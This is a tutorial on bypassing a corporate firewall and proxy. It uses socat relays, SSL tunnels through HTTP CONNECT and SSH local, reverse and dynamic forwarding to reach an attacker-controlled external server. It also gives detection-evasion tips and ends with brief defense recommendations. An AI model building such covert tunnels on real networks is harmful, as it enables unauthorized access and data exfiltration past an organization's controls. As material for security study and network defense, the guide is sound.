# Defeating Network Security Infrastructure

## Introduction

This guide explores methods for bypassing network security, specifically focusing on techniques that can be used to exfiltrate data or establish unauthorized connections through a network firewall. While these techniques have educational merit in understanding security failures, they must never be used for malicious activities or in environments you don't control.

*Disclaimer: This document is intended for educational purposes only. Use these techniques only in isolated lab environments to prevent unintended consequences.*

## Assumptions

- **Attacker's Resources:**
  - An authorized entry point for physical media (e.g., USB, CD-ROM).
  - Access to a workstation with up-to-date patches.
  - Antivirus and personal firewall software may be present.
  - Potentially, attacker has a personal device.
  - No specific exploits are required.
  - Access to an external web server under the attacker's control.

- **Network Configuration:**
  - A restrictive firewall primarily permitting outbound traffic via HTTP(S).
  - HTTP(S) access may be unrestricted or require basic/NTLM authentication.
  - Inbound connections are not permitted.

## Tools Required

- **SOCAT**: A tool for networking, enabling the transfer of data between disparate data channels.
- **SSH Clients**: OpenSSH, PuTTY, or any standard SSH clients.
- **NTLM Authorization Proxy**: For handling NTLM authentication scenarios.
- **Backtrack**: A Linux-based penetration testing suite.

## Establishing an Escape Route

### Introduction to SOCAT

SOCAT enables data relay between channels like sockets and files. It facilitates scenarios such as forwarding traffic from a local port to an external address.

```bash
# Example: Redirect traffic from local port 6666 to www.company.com on port 80
socat TCP4-LISTEN:6666 TCP4:www.company.com:80
```

### Testing SOCAT Configuration

- **Netcat:**  
  ```bash
  nc 127.0.0.1 6666
  ```

- **Telnet:**  
  ```bash
  telnet 192.168.123.81 6666
  ```

- **SOCAT (Client Mode):**  
  ```bash
  socat STDIO TCP:127.0.0.1:6666
  ```

### Accessing SSL Services

SOCAT can be used to connect to SSL-enabled services:

```bash
socat TCP4-LISTEN:6666 OPENSSL:192.168.123.50:443
```

## Proxy Bypass Techniques

### Using an HTTP Proxy

SOCAT can forward a connection via an HTTP proxy:

```bash
socat TCP4-LISTEN:6666 TCP4:proxy.company.com:8080
```

### Routing SSL Through a Proxy

SSL connections can traverse an HTTP proxy using the CONNECT method:

```bash
socat TCP4-LISTEN:6666 PROXY:proxy.company.com:ssl.company.com:443
```

### Forwarding SSH via Proxy

SOCAT can relay SSH protocols over a proxy, often limited to TCP port 443 using CONNECT:

```bash
socat TCP4-LISTEN:6666 PROXY:proxy.company.com:ssh.myserver.com:22
```

## Creating Tunnels

### SSL Tunnels

Set up an end-to-end SSL tunnel:

- **On Attacker's Machine:**
  ```bash
  socat TCP4-LISTEN:6666 OPENSSL:my.server.com:443
  ```

- **On Server:**
  ```bash
  socat OPENSSL-LISTEN:443,cert=path_to_cert TCP4:127.0.0.1:22
  ```

### Tunneling TCP over SSL and Proxy

Chain SOCAT instances to traverse proxies and establish SSL tunnels:

```bash
socat OPENSSL-LISTEN:443,cert=path_to_cert TCP4:127.0.0.1:22
socat TCP4-LISTEN:4444 PROXY:proxy.company.com:my.server.com:443
```

### Handling NTLM Authentication

Includes using an NTLM Authorization Proxy Server to authenticate with a proxy if needed.

## Advanced SSH Options

- **Local Forwarding (-L):**  
  ```bash
  ssh username@127.0.0.1 -p 6666 -L 3333:127.0.0.1:2222
  ```

- **Reverse Forwarding (-R):**  
  ```bash
  ssh username@127.0.0.1 -p 6666 -R 3333:127.0.0.1:2222
  ```

- **Dynamic Forwarding (-D):**  
  ```bash
  ssh username@127.0.0.1 -p 6666 -D 1080
  ```

## Additional Techniques and Considerations

- Utilize non-standard ports.
- Apply X.509 client certificates for SSL encryption.
- Explore SOCAT options like `fork`, `su`, `proxyport`.
- Employ fragmentation techniques to evade detection.

## Recommendations for Network Defense

- Implement highly restrictive desktop policies.
- Disable unauthorized external media boot.
- Use BIOS passwords and baseline traffic analysis.
- Employ advanced forward proxy technologies.
- Protect against VPN and SSL tunneling attacks.

## Closing Remarks

Understanding security failures aids in fortifying network defenses, yet it's important to apply knowledge ethically and responsibly.
